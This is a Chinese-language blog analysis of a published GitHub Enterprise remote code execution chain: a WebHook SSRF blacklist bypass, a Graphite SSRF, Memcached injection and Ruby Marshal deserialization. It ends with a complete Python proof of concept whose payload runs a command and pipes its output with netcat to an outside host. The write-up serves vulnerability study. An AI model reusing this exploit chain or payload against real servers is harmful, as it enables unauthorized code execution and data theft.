---
title: GitHub Enterprise远程代码执行解读
date: 2017-08-16 15:29:05
tags: web漏洞分析
categories: 技术

top_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg
---

GitHub Enterprise和GitHub的服务类似，不过它为大型企业的开发团队量身定制。

根据Github官方博客：GitHub Enterprise包括了Github之前的所有主要功能，包括提交历史、代码浏览、比较视图、推送请求、问题追踪、Wiki、Gist共享代码段、团队管理等，此外，还提供了更强大的API以及一个更漂亮的Web界面。

在GitHub Enterprise上，你可以在自己的服务器本地运行这些功能。

<!--more-->

## 漏洞解读

在GitHub Enterprise中，有一个名为WebHook的功能。关于WebHook，我在下面简单的介绍下：

Webhook是什么？

Webhook，也就是人们常说的钩子，是一个很有用的工具。可以通过定制 Webhook 来监测用户在 Github.com 上的各种事件，最常见的莫过于 push 事件。如果用户设置了一个监测 push 事件的 Webhook，那么每当用户的这个项目有了任何提交，这个 Webhook 都会被触发，这时 Github 就会发送一个 HTTP POST 请求到用户配置好的地址。

![](http://blog.nsfocus.net/wp-content/uploads/2017/08/1-4.png) ![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png)

GitHub Enterprise中的WebHook功能，在Hooks&amp;services配置选项下。它能在执行选定git操作时执行时自定义HTTP回调。

GitHub Enterprise通过Gem的faraday-restrict-ip-addresses功能来防止用户请求内部服务。下面看下faraday-restrict-ip-addresses功能是如何防止ssrf的：

![](http://blog.nsfocus.net/wp-content/uploads/2017/08/2-5.png)

这里可以看出，它是通过限定了一个黑名单的方式，来避免用户在WebHook中添加内网地址。

漏洞发现者提供了一个方法来绕过这层防护，他提出可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过它：

![](http://blog.nsfocus.net/wp-content/uploads/2017/08/3-4.png)

这个地址在Linux系统中，0代表的是localhost，在绕过faraday-restrict-ip-addresses中的黑名单同时，可以访问服务器内网资源。

现在我们可以访问内网资源了，应该想到的的是利用缓存数据进行反序列化来利用，以redis为例，我们要想在redis中写入反序列化数据，就想到要用Python的urllib库曾出过一个头注入的漏洞（CVE-2016-5699）来构造http头向redis写入数据。

再来看看我们现在控制的这处ssrf，它有一个问题，它是基于通过ruby-Gem的faraday来解析数据的，faraday中不存在CR-LF命令注入，所以没办法通过这个ssrf构造http头向缓存中写东西的。

下面的思路就是，我们要找到一个内网服务，它需要是python写的（存在头注入的漏洞），并且它也得存在一个ssrf，用来访问本地的缓存服务并向其中写入数据。

漏洞发现者找到了GitHub Enterprise中的一个这样的服务：**Graphite****服务，**Graphite中有一个ssrf漏洞，位于

webapps/graphite/composer/views.py

**![](http://blog.nsfocus.net/wp-content/uploads/2017/08/4-4.png)**

可以看出Graphite服务可以接收url地址并进行利用，如果后台采用redis进行缓存，漏洞发现者给出下面的利用构造：

![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png)

（注：Graphite服务启用在本地8000端口）

但是漏洞发现者发现“GitHub Enterprise使用Ruby Gem的Memcached方式来处理缓存，而其通过Marshal模块进行封装” 。并且他提到“GitHub Enterprise Rails控制端中存在反序列化漏洞的Marshal” Marshal模块的反序列化漏洞这里就不介绍了，可以自己分析一下。

## 漏洞利用

因此最后构造的poc如下：

#!/usr/bin/python

from urllib import quote

''' set up the marshal payload from IRB

code = "`id | nc orange.tw 12345`"

p "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"

'''

marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`id | nc orange.tw 12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'

payload = [

'',

'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),

marshal_code,

'',

''

]

payload = map(quote, payload)

url = 'http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/'

print "\nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by orange@chroot.org"

print '-'*10 + '\n'

print url + '%0D%0A'.join(payload)

print '''

Inserting WebHooks from:

https://ghe-server/:user/:repo/settings/hooks

Triggering RCE from:

https://ghe-server/search?q=ggggg&amp;type=Repositories

'''

&nbsp;

参考链接

http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html